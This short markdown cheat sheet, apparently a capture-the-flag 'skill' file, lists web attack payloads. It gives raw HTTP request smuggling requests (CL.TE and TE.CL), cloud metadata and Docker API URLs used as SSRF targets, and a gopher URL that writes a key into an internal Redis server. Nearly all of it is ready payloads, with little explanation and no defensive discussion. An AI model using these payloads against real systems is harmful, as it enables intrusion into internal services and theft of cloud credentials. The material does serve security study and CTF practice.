# Request Smuggling & SSRF (skills/web/request-smuggling-ssrf.md)

## 1. HTTP Request Smuggling (HRS)

### 1.1 CL.TE Smuggling
Frontend uses `Content-Length`, Backend uses `Transfer-Encoding`:
```http
POST / HTTP/1.1
Host: target.ctf
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### 1.2 TE.CL Smuggling
Frontend uses `Transfer-Encoding`, Backend uses `Content-Length`:
```http
POST / HTTP/1.1
Host: target.ctf
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

---

## 2. Server-Side Request Forgery (SSRF)

### 2.1 Cloud Metadata Endpoints
- **AWS / GCP / OpenStack**: `http://169.254.169.254/latest/meta-data/`
- **GCP Header Bypass**: `Metadata-Flavor: Google`
- **Docker / Kubernetes**: `http://127.0.0.1:2375/v1.24/containers/json`

### 2.2 Gopher Protocol Smuggling (Redis / FastCGI / SMTP)
- Exploit internal unauthenticated Redis:
  ```text
  gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0aflag%0d%0a$5%0d%0ahello%0d%0a
  ```
